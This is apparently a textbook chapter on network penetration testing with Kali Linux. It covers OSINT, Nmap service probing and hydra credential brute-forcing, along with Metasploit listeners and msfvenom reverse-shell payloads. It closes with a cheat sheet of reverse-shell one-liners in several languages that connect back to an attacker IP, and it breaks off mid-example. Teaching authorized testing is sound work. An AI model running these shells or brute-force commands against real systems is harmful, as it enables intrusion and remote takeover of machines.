<html><head></head><body><div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Network Penetration Testing</h1>
                </header>
            
            <article>
                
<p class="mce-root">Be prepared—this is going to be a massive chapter! In fact, this is a <span>book's worth of information</span> in one chapter. Why? Because I want it to be a reference for you to use in your future career. Network vulnerability assessment and penetration testing will be one of your major tasks when working in web application security. Say that you deploy a web application on a vulnerable operating system that is accessible from the internet—this would be a Christmas gift for a hacker who wants to get a remote shell into your company's server.</p>
<p>Most of the internet security books on the market talk about this subject (penetration testing with Kali Linux), so I asked myself, <em>Before writing this chapter</em>, <em>how can I use it myself for my own daily security tests?</em>. I want it to be useful for you as much as possible so you can use it in practice for your daily job and for your penetration testing certifications as well.</p>
<div class="packt_infobox">You can use both this and the following chapter as a cheat sheet to practice your penetration testing skills. You can use the<strong> Capture the Flag</strong> (<span><strong>CTF</strong>)</span> methodology by downloading vulnerable virtual machines and trying to exploit them to enhance your hacking skills. A good source to download these VMs from is: <a href="http://www.vulnhub.com">http://www.vulnhub.com</a>.</div>
<p>This book is for intermediate to advanced professionals who are seeking to enhance and deepen their knowledge. If you feel that the information in this chapter is overwhelming and not clear, then I invite you to watch a few online courses for beginners in penetration testing .</p>
<p>Let's go straight ahead and start this chapter, which will cover the following topics:</p>
<ul>
<li>Passive information gathering</li>
<li>Services enumeration</li>
<li>Network vulnerability assessment</li>
<li>Vulnerability exploitation</li>
<li>Privilege escalation</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Passive information gathering – reconnaissance – OSINT</h1>
                </header>
            
            <article>
                
<p><span>In the first step before the penetration testing starts, you will need to </span><span>passively</span><span> </span><span>collect the information about the company in scope. To accomplish this task, you will use the web, along with some automated tools that call the web at the backend as well. This phase is also called the collection of <strong>Open Source Intelligence</strong></span><strong> </strong>(<strong>OSINT</strong>)<span>. OSINT refers to the information collected from the internet. Another name for this phase used by security professionals is</span> <strong>reconnaissance</strong><span>. To be honest, they all refer to the same task, but you need to be aware of the different names used to describe this stage.</span></p>
<div class="packt_tip packt_infobox">If your target (whether it's your client's target or that of the organisation for which you work) is an external web application, then you can execute the information-gathering phase, but if your target is an intranet or a brand new website that has not been deployed into the production environment yet, then the OSINT is useless, unless your client (or your boss) has asked you for this task separately.</div>
<p><span>Information gathering, or OSINT, usually starts with online research as to the target's online presence</span><span>.</span></p>
<p><span>You will use public information to gather the following information:</span></p>
<ul>
<li>Company information, including the following:
<ul>
<li>Location and addresses</li>
<li>Email addresses (for example, <kbd>support@yourclientdomain.com</kbd>)</li>
<li>Other companies acquired (in both directions—it could be that your client was acquired by another company, or vice versa)</li>
<li>Domain names (DNS)</li>
<li>Business type (banking, insurance, retail, and so on)</li>
<li>Company structure</li>
<li>Company's blog articles</li>
<li>Company's social network data</li>
<li>Cached contents on the web</li>
<li>Information leaks (for example, passwords, client PII, or any sensitive information that is not meant for the public)</li>
</ul>
</li>
<li>Employee information, including the following:
<ul>
<li>Names </li>
<li>Email addresses</li>
<li>Phone numbers</li>
<li>Job position inside the company (for example, IT manager, QA engineer, and so on)</li>
<li>Social network data</li>
</ul>
</li>
<li>Web application information gathering, including the following:
<ul>
<li>The leak of web-based vulnerabilities on dumpsites</li>
<li>Web-page crawling</li>
<li>Programming languages used (for example, PHP, Java, or .NET)</li>
<li>Passive scanning using Burp (we will cover this topic in more detail in the next chapter)</li>
</ul>
</li>
</ul>
<div class="packt_tip">A good place to start is the target's website. Here, you can find most of the information in the preceding list.</div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Web search engines</h1>
                </header>
            
            <article>
                
<p>Don't just use Google as the only search engine for your online research (just type your target's company name or domain name to get your search results). Other powerful search engines exist as well, including the following:</p>
<ul>
<li><strong>Chinese search engine</strong>: <a href="http://www.baidu.com">http://www.baidu.com</a></li>
<li><strong>Russian search engine</strong>: <a href="http://yandex.com">http://yandex.com</a></li>
<li><strong>General popular search engine</strong>: <a href="http://www.duckduckgo.com">http://www.duckduckgo.com</a></li>
</ul>
<p>You can also use a dark and deep web search using the TOR network (use these search engines carefully as this technology is still evolving):</p>
<ul>
<li>
<div><strong>Onion.City</strong>: <a href="http://onion.link/">http://onion.link/</a></div>
</li>
<li>
<div><strong>Not Evil</strong>: <a href="https://hss3uro2hsxfogfq.onion.to/">https://hss3uro2hsxfogfq.onion.to/</a></div>
</li>
<li>
<div><strong>Onion.To</strong>: <a href="https://tor2web.org/">https://tor2web.org/</a></div>
</li>
<li><strong>Duck Duck Go</strong>: <a href="https://3g2upl4pq6kufc4m.onion/">https://3g2upl4pq6kufc4m.onion/</a></li>
</ul>
<div class="packt_tip">To connect to the dark web, connect to a VPN first and then connect to the TOR network using the TOR browser.</div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Google Hacking Database – Google dorks</h1>
                </header>
            
            <article>
                
<p>Google allows us penetration testers to query its search engine to our liking in order to reveal sensitive information regarding our target. The reference for finding all the interesting queries is on the Exploit-DB website at <a href="https://www.exploit-db.com/google-hacking-database/">https://www.exploit-db.com/google-hacking-database/</a>.</p>
<p>What can you search on Google? With Google dorks, you can query the search engine in order to accomplish the following:</p>
<ul>
<li>Getting a foothold on a web server</li>
<li>Revealing sensitive directories</li>
<li>Searching for vulnerable files</li>
<li>Searching for vulnerable servers</li>
<li>Revealing verbose error messages</li>
<li>Searching for a target network's vulnerability data</li>
<li>Searching for miscellaneous devices that belong to your target (for example, IP cameras)</li>
<li>Getting web server information </li>
<li>Searching for files with credentials (username or passwords) and files with confidential information</li>
<li>Searching for login pages (or admin pages)</li>
</ul>
<p>Here's a list of the most popular Google dorks queries:</p>
<ul>
<li><strong>Search for domains/subdomains</strong>: <kbd><span>site [target domain name]</span></kbd></li>
<li><strong>Search for file</strong>s: <kbd><span>filetype [ file extension]</span></kbd></li>
<li><strong>Search for strings in the URL</strong>: <kbd><span>inurl [ search criteria in the URL]</span></kbd></li>
<li><strong>Search for strings in the title</strong>: <kbd><span>intitle [search criteria in the title]</span></kbd></li>
</ul>
<div class="packt_tip">Remember that you can combine multiple queries together to get the desired results.</div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Online tools</h1>
                </header>
            
            <article>
                
<p>Some good websites exist on the internet that can be added to your arsenal:</p>
<ul>
<li><strong>Explore online vulnerabilities for servers and IOT devices</strong>: <a href="https://www.shodan.io">https://www.shodan.io</a></li>
<li><strong>Get dumped leaked information</strong>: <a href="http://www.pastebin.com">http://www.pastebin.com</a> </li>
<li><strong>Text and source code leak</strong>: <a href="https://github.com">https://github.com</a></li>
<li><strong>Online Swiss Army knife tools</strong>: <a href="https://www.dnsstuff.com">https://www.dnsstuff.com</a> </li>
<li><strong>Find interesting information about your target website</strong>:
<ul>
<li><a href="https://toolbar.netcraft.com/site_report?url=%5Btarget%20domain%20name%5D">https://toolbar.netcraft.com/site_report?url=<strong>[target domain name]</strong></a></li>
<li><a href="http://searchdns.netcraft.com">http://searchdns.netcraft.com</a></li>
</ul>
</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Kali Linux tools</h1>
                </header>
            
            <article>
                
<p>Kali Linux contains so many tools for information gathering. Some of the tools can be removed from the Kali repository so they won't be installed by default. Most of the tools that I will list will be available for download from GitHub or a simple Google search (in case they are removed from the Kali Linux distribution in the future). Another option is to use the <kbd>apt-get install</kbd> command from your Terminal window to install the required tool.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">WHOIS lookup</h1>
                </header>
            
            <article>
                
<p><span>Every domain name is registered in a public WHOIS database. Depending on the database that is queried, the response to a WHOIS request will reveal a lot of juicy information, including the following:</span></p>
<ul>
<li>
<div>Names</div>
</li>
<li>Phone numbers</li>
<li>Email addresses</li>
<li>
<div>Physical addresses</div>
</li>
<li>
<div>Domain expiry dates</div>
</li>
<li>DNS servers</li>
</ul>
<p><strong>Example</strong>:</p>
<pre>whois domain-name.com</pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Domain name system – DNS enumeration</h1>
                </header>
            
            <article>
                
<p><span>DNS enumeration will reveal information regarding domain names and IP addresses assigned to the target, as well as the route between us and the final destination.</span></p>
<p><span>In summary, t</span><span>he <strong>Domain Name System</strong> (<strong>DNS</strong>) is a database that resolves domain names (for example, <kbd>google.com</kbd>) </span><span>to its IP addresses (<kbd>172.217.10.46</kbd>).</span></p>
<p><span>You will use the DNS information for the following reasons:</span></p>
<ul>
<li><span>To identify whether the DNS server allows a </span><span>zone transfer.</span> <span>If it does,</span><span> then it will reveal the hostnames and IP addresses of internet-accessible systems.</span></li>
<li><span>By u</span><span>sing a brute-force methodology, the tool allows us to</span> <span>identify new domain </span><span>names or subdomains </span><span>associated with the target.</span></li>
<li><span>Finding </span><span>services </span><span>that may be </span><span>vulnerable </span><span>(for example, FTP).</span></li>
<li><span>Finding interesting remote administration panels.</span></li>
<li><span>Finding </span><span>misconfigured </span><span>and/or testing</span><span> servers </span><span>(<kbd>test.domain-name.com</kbd>).</span></li>
</ul>
<p><strong>Tools/Examples</strong>:</p>
<pre>dnsenum domain-name.com<br/>fierce -dns domain-name.com<br/>dnsrecon -w -d domain-name.com -t axfr<br/><br/>-w: will perform a deep whois analysis<br/>-d: target domain name<br/>-t: type of enumeration<br/>axfr: Test all NS servers for a zone transfer</pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Gathering email addresses</h1>
                </header>
            
            <article>
                
<p><span>The</span><span> </span><kbd>theharvester</kbd> <span>script</span> <span>is a Python tool/script that searches for email addresses and domains using popular search engines. </span></p>
<p><span><strong>Example</strong>:</span></p>
<pre style="padding-left: 30px"><span>theharvester -d domain-name</span>.com <span>-l</span><span> 500 -b google -h <br/></span><span><br/>-d: is for the domain name<br/>-l: in this case to limit the number of results to 100<br/>-b: stands for the datasource, in this case we have chosen google but you have more options like (google,bing,bingapi,pgp,linkedin,google-profiles,people123,jigsaw,all)<br/>-h: will use the SHODAN database to query the discovered hosts</span></pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Active information gathering – services enumeration</h1>
                </header>
            
            <article>
                
<p>This phase is all about identifying the live hosts and the services running on those hosts. Remember, <span>in this phase, </span><span>we're still gathering information to use in order to understand our target. Some people in enterprise environments just skip this test and go straight to the vulnerability assessment by executing fancy scanners, such as Nessus or Nexpose. I don't like this approach myself, unless you're on a low budget for your tests (it's better than nothing).</span></p>
<p>This phase has four steps:</p>
<ol>
<li>Getting IP addresses/ranges from your client or employer (if it's an internal project, the project manager will help with this matter)</li>
<li>Identifying live hosts</li>
<li>Listing the open ports/services on each host</li>
<li>Probing each service for more information</li>
</ol>
<div class="packt_tip">Check Appendices A, B, C, D, and E for penetration testing references.</div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Identifying live hosts</h1>
                </header>
            
            <article>
                
<p>Next, you will identify whether the host is up and running, or whether it's protected by a firewall. My favorite tool for this phase (and the upcoming phases as well) is Nmap. I strongly suggest that you familiarize yourself with Nmap. The following commands initiate Nmap and another useful host identifier:</p>
<ul>
<li><strong>Nmap ping scan</strong>:</li>
</ul>
<pre style="padding-left: 60px">nmap -sn [IP Address / range]</pre>
<ul>
<li><strong>Another tool</strong>, <strong>Netdiscover</strong>:</li>
</ul>
<pre style="padding-left: 60px">netdiscover -r [IP Address / range]</pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Identifying open ports/services</h1>
                </header>
            
            <article>
                
<p>After a quick ping scan, we can leverage our methodology to reveal the open ports and services as well. We will also use the Nmap script to probe each service, using the following commands:</p>
<ul>
<li><strong>TCP scan - intranet</strong>:</li>
</ul>
<pre style="padding-left: 60px">nmap -sS -sV -sC -sV --version-all -O --osscan-guess -T4 --reason --open -p- -Pn -v [IP address / range]</pre>
<ul>
<li><strong>UDP scan - intranet</strong>:</li>
</ul>
<pre style="padding-left: 60px">nmap -sU --top-ports 1000 -Pn -v <span>[IP address / range]</span></pre>
<ul>
<li><strong>TCP scan - from the internet (outside boundary)</strong>:</li>
</ul>
<pre style="padding-left: 60px">nmap -sS -T2 --top-ports 1000 -Pn -v <span>[IP address / range]</span></pre>
<ul>
<li><strong>UDP scan - from the internet (outside boundary)</strong>:</li>
</ul>
<pre style="padding-left: 60px">nmap -sU --top-ports 100 -Pn -v <span>[IP address / range]</span></pre>
<div class="packt_infobox">Check out <em>Appendix A</em> for a cheat sheet of Nmap.</div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Service probing and enumeration</h1>
                </header>
            
            <article>
                
<p>In the preceding step, we used the Nmap script to quickly probe each service that we found. In this step, we will take this information to the next step and try to probe aggressively. The Nmap scripts that we will use in the following examples are both very aggressive and time-consuming:</p>
<ul>
<li><strong>Port TCP 21 – FTP</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 21 -Pn -T5 --host-timeout 15m --script=ftp* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Credential brute force</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] ftp://[IP address]</pre>
<ul>
<li><strong>Port TCP 22 – SSH</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 22 -Pn -T5 --host-timeout 15m --script=ssh* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Credential brute force</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] ssh://[IP address]</pre>
<ul>
<li><strong>Port TCP 23 – Telnet</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 23 -Pn -T5 --host-timeout 15m --script=telnet* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Credential brute force</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] telnet://[IP address]</pre>
<ul>
<li><strong>Port TCP 25 – SMTP</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 25 -Pn -T5 --host-timeout 15m --script=smtp* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Connect to the server and execute the VRFY command</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">telnet [IP] 25<br/>Then execute the command once connected:<br/>VRFY [user] (e.g. VRFY John)</pre>
<ul>
<li><strong>Port TCP/UDP 53 – DNS</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 53 -Pn -T5 --host-timeout 15m --script=dns* -v [IP address]</pre>
<ul>
<li><strong>Port TCP 80 – HTTP</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 80 -Pn -T5 --host-timeout 200m --script=http* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Probing using Nikto</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nikto -host http://[IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Probing using WhatWeb</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">whatweb [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Directory crawling</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">gobuster -u http://[IP address]-w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e</pre>
<ul>
<li><strong>Port TCP 110 – POP3</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 110 -Pn -T5 --host-timeout 15m --script=pop3* -v [IP address]</pre>
<ul>
<li><strong>Ports UDP <span>ports 137, 138  TCP ports 137, 139 – Netbios &amp; TCP 445 – Samba (SMB)</span></strong>:<strong><span> </span></strong>
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 139,445 -Pn -T5 --host-timeout 200m --script=smb* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Using Enum4Linux to probe SMB</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">enum4linux -a [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Using nmblookup to probe SMB</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmblookup -A [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Netbios probing using nbtscan</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nbtscan -r [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Listing SMB shares</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">smbclient -L [IP address] -N</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Connecting to a shared directory</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">smbclient //[IP address]/[Shared directory]</pre>
<ul>
<li><strong>Port UDP 161 – SNMP</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 161 -Pn -T5 --host-timeout 15m --script=snmp* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Enumerating the MIB tree</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">snmpwalk -c public -v1 [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Probing SNMP using the snmp-check tool</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">snmp-check -t [IP address]</pre>
<ul>
<li><strong>Port TCP 389 – LDAP</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 389 -Pn -T5 --host-timeout 15m --script=ldap* -v [IP address]</pre>
<ul>
<li><strong>Port TCP 443 – HTTPS/SSL</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 443 -Pn -T5 --host-timeout 15m --script=ssl* -v [IP address]</pre>
<ul>
<li><strong>Port TCP 1433 – Microsoft SQL Server (MSSQL)</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 1433 -Pn -T5 --host-timeout 15m --script=ms-sql* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Brute force for credentials</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] mssql://[IP address]</pre>
<ul>
<li><strong>Port TCP 3306 – MySQL</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 3306 -Pn -T5 --host-timeout 15m --script=mysql* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Brute force for credentials</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] mysql://[IP address]</pre>
<ul>
<li><strong>Port TCP/UDP 3389 – Remote Desktop Protocol (RDP)</strong>:
<ul>
<li><strong>Nmap script probing</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">nmap -sV -p 3389 -Pn -T5 --host-timeout 15m --script=rdp* -v [IP address]</pre>
<ul>
<li style="list-style-type: none">
<ul>
<li><strong>Brute force for credentials</strong>:</li>
</ul>
</li>
</ul>
<pre style="padding-left: 120px">hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] rdp://[IP address]</pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Vulnerability assessment</h1>
                </header>
            
            <article>
                
<p>In the previous section, we enumerated the services aggressively. Some of the Nmap scripts will check for vulnerabilities—for example, when entering the option <kbd>--script=http*</kbd>, Nmap, in this case, will execute all the HTTP scripts, including the ones that check for vulnerabilities, for example, <kbd>http-vuln-cve2010-2861</kbd>.</p>
<p>In reality, in an enterprise environment, we would use automatic scanners, either Nessus or Nexpose. Nowadays, these companies offer scanners on the cloud as well—for example, the Nexpose equivalent in the cloud is called InsightVM. We <span>heavily</span><span> </span><span>rely on these scanners to identify the vulnerabilities in the network infrastructure. Your role is to take the results and make sure that these flaws exist—in other words, that they're not false positives.</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">OpenVas</h1>
                </header>
            
            <article>
                
<p>What if you want to practice vulnerability assessment? You can install and use a free vulnerability assessor called OpenVas. To install it on Kali Linux, go to <a href="https://www.kali.org/penetration-testing/openvas-vulnerability-scanning">https://www.kali.org/penetration-testing/openvas-vulnerability-scanning</a>.</p>
<div class="packt_tip">Do not forget to save the generated password while installing OpenVas. Generally, the password is displayed in the last step of the installation.</div>
<p>To scan an IP address or range using OpenVas, perform the following steps:</p>
<ol>
<li>Make sure that the OpenVas service has already started using <kbd>$ service openvas-manager start</kbd>.</li>
<li>Open it in the browser using <kbd>firefox https://127.0.0.1:9392</kbd>.</li>
<li>Enter the default username <kbd>admin</kbd> and the password that was generated for you in the installation process.</li>
<li>In the menu, select the <span class="packt_screen">Configuration</span> tab, then select <span class="packt_screen">Target.</span></li>
<li>Add a new target by clicking on the <span class="packt_screen">New Target</span> button (the icon of the button is a blue star, generally located in the top-left corner of the screen).</li>
<li>In the new target window, make sure you fill in the following:
<ul>
<li>Target name</li>
<li>IP/range</li>
<li>Port list</li>
</ul>
</li>
<li>After saving the target, select the <span class="packt_screen">Scans</span> menu and click on the <span class="packt_screen">Tasks</span> item.</li>
<li>Add a task using the <span class="packt_screen">New Tasks</span> button (the blue star icon).</li>
<li>Make sure that you choose the following options for the task:
<ul>
<li>Name</li>
<li>Specify the previously created <span class="packt_screen">Target</span></li>
<li>Choose the right <span class="packt_screen">Scan Config</span></li>
</ul>
</li>
<li>After creating the task, it should appear in the <span class="packt_screen">Tasks</span> main page.</li>
<li>Under the <span class="packt_screen">Actions</span> column, click on the <span class="packt_screen">Start</span> button (a green play icon).</li>
<li>The scanner will display the <span>Done </span>status (in the column) when it completes the task.</li>
<li>Under the <span class="packt_screen">Report</span> column, click on the link to display the vulnerability results.</li>
</ol>
<div class="packt_infobox">Before you start the exploitation phase, I encourage you to familiarize yourself with Metasploit. <span>Check out <em>Appendix B</em> for a full cheat sheet of Metasploit.</span></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Exploitation</h1>
                </header>
            
            <article>
                
<p>The exploitation phase is accomplished by exploiting a vulnerability found on the target machine and getting a remote shell as well. That's it! Simple, right? Let's get started.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Finding exploits</h1>
                </header>
            
            <article>
                
<p>Generally speaking, 99% of the time, the vulnerability scanner will tell you where to find the exploit in order to replicate it from your end. Here's where to find most of the exploits:</p>
<ul>
<li>Google it—it sounds simple, but it's my favorite method</li>
<li><kbd>Exploit-db</kbd> at <a href="http://www.exploit-db.com">http://www.exploit-db.com</a></li>
<li>The <span class="packt_screen">searchsploit</span> tool in Kali Linux</li>
<li>Metasploit—use the <kbd>search</kbd> command to find it</li>
<li>Security Focus at <a href="http://www.securityfocus.com">http://www.securityfocus.com</a></li>
<li>Sometimes you will find them on GitHub, at <a href="http://www.github.com">http://www.github.com</a></li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Listener setup</h1>
                </header>
            
            <article>
                
<p><span>Before uploading and executing the payload, you will need to set up and execute a listener on Kali Linux. </span></p>
<p>To create a listener using <strong>Metasploit</strong>, enter the following:</p>
<pre><span>use exploit/multi/handler<br/></span><span>set PAYLOAD [msfvenom Payload name]<br/></span><span>set LHOST [Kali IP address]<br/></span><span>set LPORT [Listening port on Kali]<br/></span><span>set ExitOnSession false<br/></span><span>exploit -j -z</span></pre>
<p>To create a listener using <strong>netcat</strong>, use the following:</p>
<pre>nc -nlvp [listening port on Kali]</pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Generating a shell payload using msfvenom</h1>
                </header>
            
            <article>
                
<p>We will now discuss how we can go about generating a shell payload using <kbd>msfvenom</kbd> across different platforms:</p>
<ul>
<li style="color: black"><strong>Linux</strong>:</li>
</ul>
<pre style="color: black;padding-left: 60px">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f elf &gt; linux_shell.elf</pre>
<ul>
<li style="color: black"><strong>Windows</strong>:</li>
</ul>
<pre style="color: black;padding-left: 60px">msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f exe &gt; windows_shell.exe</pre>
<ul>
<li style="color: black"><strong>macOS</strong>:</li>
</ul>
<pre style="color: black;padding-left: 60px">msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f macho &gt; mac_shell.macho</pre>
<ul>
<li class="mce-root"><span><strong>PHP</strong>:</span></li>
</ul>
<pre style="padding-left: 60px" class="mce-root"><span>msfvenom -p php/meterpreter/reverse_tcp </span>LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] <span>-f raw &gt; php_shell.php</span></pre>
<div class="mce-root packt_infobox"><span>If you use</span> <kbd>php</kbd><span>/<kbd>reverse_php</kbd>, then open the output file generated by</span> <kbd>msfvenom</kbd> <span>with an editor and add </span><kbd>&lt;?php</kbd> <span>at the beginning and  </span><kbd>?&gt;</kbd><span>  at the end of the script.</span></div>
<ul>
<li style="color: black"><strong>ASP</strong>:</li>
</ul>
<pre style="color: black;padding-left: 60px">msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f asp &gt; asp_shell.asp</pre>
<ul>
<li style="color: black"><strong>JSP</strong>:</li>
</ul>
<pre style="color: black;padding-left: 60px">msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f raw &gt; jsp_shell.jsp</pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Custom shells</h1>
                </header>
            
            <article>
                
<p><span><span>If you don't want to use <kbd>msfvenom</kbd>, then you can create your own custom shells. Here are some examples:</span></span></p>
<ul>
<li><strong>Bash</strong></li>
</ul>
<pre style="padding-left: 60px">bash -i &gt;&amp; /dev/tcp/[Your Kali IP Address]/[Your Listening Port on Kali] 0&gt;&amp;1</pre>
<div class="packt_infobox">In the following examples, I will assume that my Kali IP is <kbd>10.1.1.100</kbd> and the listening port is <kbd>4444</kbd>.</div>
<ul>
<li><strong>PERL</strong></li>
</ul>
<pre style="padding-left: 60px">perl -e 'use Socket;$ip="10.1.1.100";$prt=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($prt,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
<ul>
<li><strong>Python</strong></li>
</ul>
<pre style="padding-left: 60px">python -c 'import socket,subprocess,os;skt=socket.socket(socket.AF_INET,socket.SOCK_STREAM);skt.connect(("10.1.1.100",4444));os.dup2(skt.fileno(),0); os.dup2(skt.fileno(),1); os.dup2(skt.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<div class="packt_tip">Speaking of Python, if you get a remote shell, you can spawn a TTY shell using <kbd><span>python -c 'import pty; pty.spawn("/bin/sh")'</span></kbd><span>.</span></div>
<ul>
<li><strong>PHP</strong></li>
</ul>
<pre style="padding-left: 60px">php -r '$sock=fsockopen("10.1.1.100",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<ul>
<li><strong>Ruby</strong></li>
</ul>
<pre style="padding-left: 60px">ruby -rsocket -e'f=TCPSocket.open("10.1.1.100",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<ul>
<li><strong>Netcat</strong></li>
</ul>
<pre style="padding-left: 60px">nc -e /bin/sh 10.1.1.100 4444</pre>
<ul>
<li><strong>Java</strong></li>
</ul>
<pre style="padding-left: 60px">rt = Runtime.getRuntime()
